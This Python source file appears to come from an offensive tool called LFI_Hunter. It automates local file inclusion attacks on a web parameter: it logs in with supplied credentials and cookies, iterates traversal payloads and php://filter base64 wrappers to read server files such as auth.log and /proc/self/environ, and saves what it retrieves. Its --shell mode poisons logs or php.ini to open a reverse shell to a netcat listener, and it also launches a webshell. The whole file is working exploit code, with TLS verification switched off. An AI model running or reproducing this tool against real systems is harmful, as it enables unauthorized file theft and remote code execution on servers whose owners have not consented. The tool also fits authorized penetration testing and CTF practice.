#!/usr/bin/env python3
import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
import os
import subprocess
ssl._create_default_https_context = ssl._create_unverified_context  
path = ('file://'+os.getcwd()+'/FileStore/')

class Read_File:
   try:
     def __init__(self,**kwargs):
            if self.args.readuser or self.args.config:
                try: 
                    with open(self .args.readuser,'r') as username:
                        self.args.user = username.read().replace('\n','')  
                except TypeError:
                    pass         
            if self.args.readpass or self.args.config:
                try:
                    with open(self.args.readpass,'r') as password:
                       self.args.password = password.read().replace('\n','')
                except TypeError:
                    pass       
            try:   
                if self.args.Cookie  or self.args.config:
                    with open(self.args.Cookie,'r') as Cookie_file :
                      self.Cookie =  Cookie_file.read()
                elif not self.args.Cookie or self.args.config:
                    with open("./Package/ConfigFile/.Cookie.txt",'r') as Cookie_file :
                        self.Cookie =  Cookie_file.read()      
            except Exception as e :
                   print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                   print("[*] Error : ",e )
                   print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                   print("[*] Chech the File Name or File Path  to your Cookies File")
                   exit() 
            print('\n'+'='*20+"\n[*] Input-INFO "+'\n'+'='*30+'\n')
            if self.args.auth:
               print("[+] Mothead             : ................ | : Full authentication")    
               try:
                  print("[+] Login url           : ................ | : "+self.args.loginurl)
                  print("[+] username            : ................ | : "+self.args.user.replace("\n",''))
                  print("[+] Login password      : ................ | : "+self.args.password)
               except Exception as e:
                    print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                    print("[*] Error: ", e)
                    print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTIONS\n" + '=' * 14 + '\n')
                    print("[*] Verify the login information: username and password.")
                    print("[*] Use the following format: --loginurl <url> --username <username> --password <password>")
                    print("[*] Ensure the username and password are correct.")
                    print("[*] Example: --loginurl http://10.10.10.44/login.php --user admin --password admin")
                    print("[*] Refer to the README file at: https://www.github.com/jac11/LFI_Hunter.git")
                    exit()                          
            if self.args.filelist:
                print("[+] LFI-wordlist        : ................ | : "+self.args.filelist)
            else:
                if self.args.read:
                   print("[+] File Target         : ................ | : ", str(self.args.read))  
                else:    
                   print("[+] LFI-wordlist        : ................ | : LFI-wordlist.txt") 
            print("[+] Vulnrenable url     : ................ | : "+str(self.args.Vulnurl))
            if self.args.base64:
               print("[+] PHP-Filter          : ................ | : Convert-base64") 
            print("[+] web Cookies         : ................ | : "+self.Cookie)  
            if self.args.auth and (self.args.Vulnurl or self.args.Domain)\
            and self.args.password and self.args.user\
            and self.args.loginurl\
            and self.args.read:
                Read_File.Login_auth(self,args = self.control)
                Read_File.url_request(self,args = self.control)
            elif not self.args.auth and (self.args.Vulnurl or self.args.Domain)\
            and not self.args.password and not self.args.user and self.args.read :
           
                Read_File.url_request(self,args = self.control)
            else:
                print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                print("[*] Error: Bad argument logic command error")
                print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTIONS\n" + '=' * 14 + '\n')
                print('[+] To use LFI with login      : --auth --loginurl --vulnurl --user --password --filelist --cookie') 
                print('[+] To use LFI without login   : --vulnurl --filelist --cookie') 
                print("[*] Refer to the README file at: https://www.github.com/jac11/LFI_Hunter.git")
                exit()            
     def Login_auth(self,**kwargs):
               loginurl = self.args.loginurl
               request = mechanize.Browser()
               request.set_handle_robots(False)
               request.set_handle_redirect(True)
               request.set_handle_refresh(True, max_time=1)    
               request.set_handle_equiv(False)
               request.set_handle_gzip(False)
               request.addheaders = [
                                ("User-Agent", "curl/7.88.1"),
                                ("Accept", "*/*"),
                                ("Accept-Encoding", "identity"),
                                ("Connection", "close"),
                                ('Cookie',str(self.Cookie).replace('\n','')),
                                ('username',f'{self.args.user}'),
                                ('password',f'{self.args.password}')]
               try:                  
                  url_login = request.open(loginurl,timeout=5)
               except urllib.error.URLError as e :
                   print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                   print("[*] Error : ",e )
                   print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTIONS\n" + '=' * 14 + '\n')
                   print("[*] Use the following format ")
                   print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                   print("[*] Example : http://10.10.10.193:4000/login.php")
                   exit()          
               try: 
                  request.select_form(nr = 0)
               except Exception :
                  try:
                    request.select_form(nr = 1)                 
                  except Exception:
                     try:
                       request.select_form(nr = 2)
                     except Exception:      
                        try:
                           request.select_form(nr = 3)
                        except Exception:
                            try:
                                request.select_form(nr = 4)                        
                            except Exception as e:
                                print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                                print("[*] Error: ", e)
                                print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTION\n" + '=' * 14 + '\n')
                                print("[*] Try using the method without login authentication.")
                                print('[+] To use LFI without login: --vulnurl --filelist --cookie')
                                exit()                
               if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
                   request["username"] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}' 
               elif self.args.user and  self.args.password and not self.args.PassForm and  self.args.UserForm:
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}'
               elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
                   request["username"] = f'{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
               elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
               response   = request.submit()         
               self.info  = response.info()
               content    = response.read()  
               self.url   = response.geturl()   
                  
     def url_request(self,**kwargs):  
        try:
            try: 
              domain = str(re.search(r'https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Vulnurl)).split()
              self.ip_re = (domain[-1][7:-2])
              self.ip_re = self.ip_re[6:]
            except Exception :
               self.ip_re = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',self.args.Vulnurl)
               self.ip_re = self.ip_re.group()
               print(self.ip_re)
            if not os.path.exists('./FileStore/'+self.ip_re+"/"):
                  os.makedirs('./FileStore/'+self.ip_re+"/") 
            if self.args.auth:
              Read_File.Login_auth(self,args = self.control)  
                         
            with open('./Package/LFT_one.txt','r') as readline :
                command_dir = readline.readlines()
                for LINE in command_dir :
                    LINE.replace('\n','')
                    self.LFI = ''
                    phpfillter = 'php://filter/read=convert.base64-encode/resource='
                    if self.args.base64:
                        if 'sess_' not in self.args.read :
                            URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
                        else:
                            URL= self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+self.args.read.split("_")[0]+"_"+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))  
                    elif "sess_" in self.args.read: 
                        URL = self.args.Vulnurl+LINE.replace('\n','')+self.args.read.split("_")[0]+"_"+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))         
                    else:    
                        URL = self.args.Vulnurl 
                    if not "sess_" in self.args.read:    
                        if '//' in LINE and not 'file' in LINE:  
                            self.LFI =URL+LINE+self.args.read.replace('/','//')
                        elif '%2f' in LINE  :
                              self.LFI = URL+LINE+self.args.read.replace('/','%2f')
                        elif 'file:' in LINE :
                             self.LFI = URL+LINE+self.args.read.replace('/','',1)       
                        else:
                            self.LFI = (URL+LINE+self.args.read).replace('\n','')   
                    if "sess_" in self.args.read:
                        self.url = URL  
                    else:                                                                                                    
                        self.url = self.LFI   
                    request = mechanize.Browser()
                    request.set_handle_robots(False)
                    request.set_handle_redirect(True)
                    request.set_handle_refresh(True, max_time=1)    
                    request.set_handle_equiv(False)
                    request.set_handle_gzip(False)
                    request.addheaders = [
                                ("User-Agent", "curl/7.88.1"),
                                ("Accept", "*/*"),
                                ("Accept-Encoding", "identity"),
                                ("Connection", "close"),
                                ('Cookie',str(self.Cookie).replace('\n','')),
                                ('username',f'{self.args.user}'),
                                ('password',f'{self.args.password}')]
                    try:
                        try:
                            self._first_req = request.open(self.args.Vulnurl, timeout=5).read()
                      
                        except Exception:
                            self._first_req = b''
                        self.Get_Oregnal_URL = request.open(self.url, timeout=5).read()

                    except KeyboardInterrupt:
                        print("\n[!] Scan stopped by user")
                        return 
                    except Exception:
                        continue
                    except KeyboardInterrupt:
                         exit()           
                    if self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) or self.args.auth and len(self.Get_Oregnal_URL) > 200  :                  
                        pythex = str(re.findall('Content-Length:.+',str(self.info)))
                        pythex= pythex.replace("['",'').replace("']",'')
                        if pythex in str(self.info):
                           info = str(self.info).replace(pythex,'Content-Length:'+str(len(self.Get_Oregnal_URL)))
                           rex2 = re.findall(':.+',info)
                           print('='*20+"\n[*] Web-Info "+'\n'+'='*30+'\n')
                           print("[+] Date                : ................ | "+rex2[0])
                           print("[+] Server              : ................ | "+rex2[1])
                           print("[+] Expires             : ................ | "+rex2[2])
                           print("[+] Cache-Control       : ................ | "+rex2[3])
                           print("[+] Pragma              : ................ | "+rex2[4])
                           print("[+] Vary                : ................ | "+rex2[5])
                           print("[+] Content-Length      : ................ | "+str(rex2[6]).replace(':',': '))
                           print("[+] Connection          : ................ | "+rex2[7])
                           print("[+] Content-Type        : ................ | "+rex2[8]+'\n')
                           print('\n'+'='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
                           print("[+] Vulnerable  Link    : ................ | : "+self.url.replace('\n',''))                           
                           Read_File.file_name (self,**kwargs) 
                           from Package.FileStore import FileManager
                           FileManager.FileRStore_Write(self,args=self.control)                         
                           print('\n'+'='*20+"\n[*] Path Traversal "+'\n'+'='*30+'\n')
                           print("[+] File request        : ................ | : "+self.args.read.replace('_',"/")) 
                           print("[+] Full Path           : ................ | : "+self.LFI.replace('\n',''))
                           print("[+] File Name           : ................ | : "+self.args.read)
                           if '/' in self.args.read:
                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"+self.args.read)  
                           else:
                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"+self.args.read) 
                           if self.args.shell :
                                if  "auth" in  self.url or "auth.log" in  self.url\
                                or "environ" in self.url or "environ" in self.url \
                                or "/apache2/php.ini" in self.url or "access.log" in self.url\
                                or "access" in self.url \
                                or  "fpm/php.ini" in self.url or 'sessions' in self.url:  
                                    print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                    time.sleep(1)
                                    print("[+] Attack type          : ................ | : Reverse-Shell") 
                                    if self.args.port: 
                                        with open("./Package/shell/.port",'w') as port:
                                            port.write(self.args.port)
                                    if "php.ini" in self.url:
                                        print("[+] Mothead              : ................ | : injecting PHP Wrappers  ")
                                    else:
                                        print("[+] Mothead              : ................ | : injecting log file  ")  
                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                    print("[+] Lisliner IP          : ................ | :",self.args.shell)   
                                    if not self.args.port:
                                        if os.path.exists("./Package/shell/.port"):
                                            os.remove("./Package/shell/.port")
                                        print("[+] Lisliner Port        : ................ | : 7777") 
                                    else:
                                       print("[+] Lisliner Port        : ................ | : " + self.args.port)   
                                    from Package.LFT_Shell_connect import Shell_conncet
                                    Shell_conncet.Connect_SSh_Shell(self,args = self.control)
                                    exit()
                                else:
                                    print('\n' + '=' * 20 + "\n[*] SHELL INFORMATION\n" + '=' * 30 + '\n')
                                    time.sleep(1)
                                    print("[*] FILE: ", self.args.read)
                                    time.sleep(1)
                                    print("[*] INFO: Unable to add PHP code to", self.args.read)
                                    time.sleep(1)
                                    print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTION\n" + '=' * 14 + '\n')
                                    print("[*] To obtain a shell, try using --read with the 'environ' or 'auth' log file.")
                                    print("[*] Example : --read /var/log/auth.log ")
                                    print("[*] Example : --read /proc/self/environ")
                                    print("[*] Example : --read /var/log/auth")
                                    exit()  
                           elif self.args.webshell or self.args.config:
                                from Package.webshell import WebShellInteract    
                                if 'auth' in self.url or 'auth.log' in self.url:
                                    WebShellInteract.__init__(self) 
                                    WebShellInteract.Soures_Web(self,**kwargs) 
                                else:   
                                    WebShellInteract.__init__(self)  
                                    WebShellInteract.WebShell(self,**kwargs)  
                                exit()             
                           else:
                                exit()     
                    elif not self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) or len(self.Get_Oregnal_URL) > 200 :
                           Read_File.file_name (self,**kwargs)
                           from Package.FileStore import FileManager
                           FileManager.FileRStore_Write(self,args=self.control) 
                           print('\n'+'='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
                           print("[+] Vulnerable  Link    : ................ | : "+self.url.replace('\n','')) 
                           print('\n'+'='*20+"\n[*] Path Traversal "+'\n'+'='*30+'\n')
                           print("[+] File request        : ................ | : "+self.args.read.replace("_","/")) 
                           print("[+] Full  URL           : ................ | : "+ self.LFI.replace('\n',''))
                           print("[+] File Name           : ................ | : "+self.args.read)
                         
                           if '/' in self.args.read:
                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re+'/'+self.args.read) 
                           else:
                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re+'/'+self.args.read)              
                           if self.args.shell :
                                if  "auth" in  self.url or "auth.log" in  self.url\
                                or "environ" in self.url or "/apache2/php.ini" in self.url \
                                or  "fpm/php.ini" in self.url or 'sessions' in self.url\
                                or "access.log" in self.url\
                                or "access" in self.url: 
                                    print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                    time.sleep(1)
                                    print("[+] Attack type          : ................ | : Reverse-Shell") 
                                    if self.args.port: 
                                        with open("./Package/shell/.port",'w') as port:
                                            port.write(self.args.port)
                                    if "php.ini" in self.url:
                                        print("[+] Mothead              : ................ | : injecting PHP Wrappers  ")
                                    else:
                                        print("[+] Mothead              : ................ | : injecting log file  ")    
                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                    print("[+] Lisliner IP          : ................ | :",self.args.shell)   
                                    if not self.args.port:
                                        if os.path.exists("./Package/shell/.port"):
                                            os.remove("./Package/shell/.port")
                                        print("[+] Lisliner Port        : ................ | : 7777") 
                                    else:
                                       print("[+] Lisliner Port        : ................ | : " + self.args.port)   
                                    from Package.LFT_Shell_connect import Shell_conncet
                                    Shell_conncet.Connect_SSh_Shell(self,args = self.control)
                                    exit()
                                else:
                                    print('\n' + '=' * 20 + "\n[*] SHELL INFORMATION\n" + '=' * 30 + '\n')
                                    time.sleep(1)
                                    print("[*] FILE: ", self.args.read)
                                    time.sleep(1)
                                    print("[*] INFO: Unable to add PHP code to", self.args.read)
                                    time.sleep(1)
                                    print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTION\n" + '=' * 14 + '\n')
                                    print("[*] To obtain a shell, try using --read with the 'environ' or 'auth' log file.")
                                    print("[*] Example : --read /var/log/auth.log ")
                                    print("[*] Example : --read /proc/self/environ")
                                    print("[*] Example : --read /var/log/auth")
                                    exit()  
                           elif self.args.webshell or self.args.config:
                                from Package.webshell import WebShellInteract    
                                if 'auth' in self.url or 'auth.log' in self.url:
                                    WebShellInteract.__init__(self) 
                                    WebShellInteract.Soures_Web(self,**kwargs) 
                                else:   
                                    WebShellInteract.__init__(self)  
                                    WebShellInteract.WebShell(self,**kwargs)  
                                exit()             
                           else:
                                exit()   
                print('\n'+'='*20+"\n[*] RESUITE-INFO "+'\n'+'='*30+'\n')
                print("[*] No Data found")
                print("[*] No Permission To read the File")
                print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                print("[*] try to use new cookie ")
                print("[*] try to use aggressive mode ")                
                if not self.args.base64:
                   print("[*] try to use PHP Filter by useing -B/--base64 ")  
                print("[*] Refer to the README file at: https://www.github.com/jac11/LFI_Hunter.git")   
                exit()                       
        except SyntaxError as a :
               print(a)
               exit()                                                                                             
     def file_name (self,**kwargs):
        if not self.args.read :
          self.args.read = str("".join(re.findall('=.+',self.url)))\
          .replace("/","_").replace("=",'').replace(".",'').replace('%','')\
          .replace("2f",'').replace('2e','')
        else:
            if "%" not in  self.args.read :
                self.args.read = re.sub(r'/','_',self.args.read,flags=re.MULTILINE) 
            else:
                decoded_path = urllib.parse.unquote(self.args.read)
                Match = re.search(r"/([^/]+)\x00",decoded_path)
                self.args.read = Match.group(1) 
        
        with open (".RQData",'w')as RQ :
             RQ.write(str(self._first_req))   
   except Exception  as a :
        print(a)                                       
if __name__=='__main__':
   Read_File()    
